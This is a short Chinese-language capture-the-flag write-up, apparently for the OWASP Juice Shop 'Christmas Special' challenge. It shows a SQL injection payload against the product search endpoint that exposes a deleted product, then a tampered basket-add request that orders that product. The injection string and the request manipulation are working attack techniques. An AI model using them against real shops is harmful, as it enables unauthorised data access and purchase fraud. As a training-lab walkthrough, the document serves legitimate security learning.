---
title: Christmas Special
description: 使用 SQL 注入获取隐藏商品信息，绕过前端在 API 中提交目标商品信息的请求
---

- 描述：Order the Christmas special offer of 2014.
- 关联挑战 Database Schema
- 商品检索端点 ```/rest/products/search?q= ```
    向量 ```foo%')) or 1=1--``` 得到全部产品信息
    在其中找到目标商品信息
    ```json
    {
        "id": 10,
        "name": "Christmas Super-Surprise-Box (2014 Edition)",
        "description": "Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
        "price": 29.99,
        "deluxePrice": 29.99,
        "image": "undefined.jpg",
        "createdAt": "2025-12-14 04:39:27.597 +00:00",
        "updatedAt": "2025-12-14 04:39:27.597 +00:00",
        "deletedAt": "2025-12-14 04:39:27.755 +00:00"
    }
    ```
- 商品添加请求 ```POST /api/BasketItems/ HTTP/1.1```
    ```json
    {
        "ProductId": 42,
        "BasketId": "3",
        "quantity": 1
    }
    ```
    在此请求中修改请求体 JSON 字段值为目标商品id
    ```json
    {
        "ProductId":10,
        "BasketId":"3",
        "quantity":1
    }
    ```
    完成购物流程后通过挑战
- 示例解决方案将此作为盲注，响应的错误信息暴露了完整的查询。挑战设计或示例解决方案不恰当